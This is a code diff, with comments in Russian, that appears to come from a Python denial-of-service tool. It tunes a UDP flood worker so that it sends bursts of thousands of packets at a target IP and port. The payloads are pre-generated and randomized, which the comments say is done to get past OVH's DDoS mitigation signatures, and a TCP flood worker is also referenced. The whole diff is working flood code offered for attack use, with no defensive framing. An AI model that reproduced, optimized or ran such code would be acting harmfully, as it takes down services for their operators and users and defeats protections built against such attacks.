@@ -41,14 +41,18 @@ async def tcp_flood_worker(target_ip, target_port, payload, semaphore, worker_id
 async def udp_flood_worker(target_ip, target_port, payload, semaphore, worker_id):
 	# Создаем ОДИН сокет на воркер вне цикла, чтобы не нагружать ОС
 	sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-	# Убираем неблокирующий режим для сырой скорости, Python будет использовать системный TCP/UDP буфер
+	
+	# Пред-генерация 50 уникальных пейлоадов, чтобы снять огромную нагрузку
+	# с CPU (вызов random в бесконечном цикле убивал скорость Python скрипта)
+	precompiled_payloads = [payload[:10] + random.randbytes(len(payload)-10) for _ in range(50)]
+	
 	while True:
 		try:
 			# Огромный бёрст напрямую в ОС без asyncio.sleep между пакетами
-			for _ in range(5000):
-				# Генерация динамического мусора на лету, чтобы пробить базовые сигнатуры OVH VAC
-				dynamic_payload = payload[:10] + random.randbytes(len(payload)-10)
-				sock.sendto(dynamic_payload, (target_ip, target_port))
+			for p in precompiled_payloads:
+				# 100 отправок одного варианта, потом смена (5000 пакетов за микро-цикл)
+				for _ in range(100):
+					sock.sendto(p, (target_ip, target_port))
 				
 			if random.random() < 0.05:
 				logging.info(f"[L4 UDP] Worker {worker_id} successfully sent massive burst.")
